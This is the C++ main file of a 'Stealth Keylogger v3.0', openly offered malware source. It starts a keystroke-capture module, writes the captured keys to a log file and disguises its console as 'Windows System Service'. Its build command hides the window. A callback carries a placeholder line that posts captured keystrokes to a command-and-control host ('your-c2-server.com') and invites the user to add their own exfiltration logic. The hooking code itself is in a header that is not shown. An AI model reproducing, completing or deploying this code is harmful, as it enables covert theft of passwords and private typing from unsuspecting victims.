/*
 * Stealth Keylogger
 *
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Compile: g++ -o keylogger.exe main.cpp -mwindows -static
 */

#include <windows.h>
#include <iostream>
#include "Keylogger.h"

using namespace std;

// Global flag for clean exit
bool g_running = true;

// Callback function for network exfiltration
void KeystrokeCallback(const wstring& data) {
    wcout << L"\n[CALLBACK] Captured keystroke buffer:\n" << data << endl;
    
    // Example: Send to remote server (implement your own exfiltration logic)
    // HTTPPost("https://your-c2-server.com/keylog", data);
}

// Console control handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT) {
        wcout << L"\n[INFO] Shutting down keylogger..." << endl;
        g_running = false;
        Keylogger::Stop();
        return TRUE;
    }
    return FALSE;
}

int main() {
    // Set console title
    SetConsoleTitleW(L"Windows System Service");
    
    // Register console handler for Ctrl+C
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        wcerr << L"[ERROR] Failed to set control handler" << endl;
        return 1;
    }
    
    wcout << L"========================================" << endl;
    wcout << L"  Stealth Keylogger v3.0" << endl;
    wcout << L"  Copyright (c) 2025" << endl;
    wcout << L"========================================\n" << endl;
    
    // Start keylogger with callback and file logging
    wcout << L"[INFO] Starting keylogger..." << endl;
    
    if (!Keylogger::Start(KeystrokeCallback, true)) {
        wcerr << L"[ERROR] Failed to start keylogger" << endl;
        return 1;
    }
    
    wcout << L"[SUCCESS] Keylogger active!" << endl;
    wcout << L"[INFO] Log file: " << Keylogger::GetLogFilePath() << endl;
    wcout << L"\nMonitoring keystrokes..." << endl;
    wcout << L"  - Press ENTER to send buffer via callback" << endl;
    wcout << L"  - Right-click to flush buffer instantly" << endl;
    wcout << L"  - Press Ctrl+C to stop\n" << endl;
    
    // Message loop to keep hooks active
    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    wcout << L"\n[INFO] Stopping keylogger..." << endl;
    Keylogger::Stop();
    wcout << L"[INFO] Keylogger stopped. Log saved to: " << Keylogger::GetLogFilePath() << endl;
    
    return 0;
}
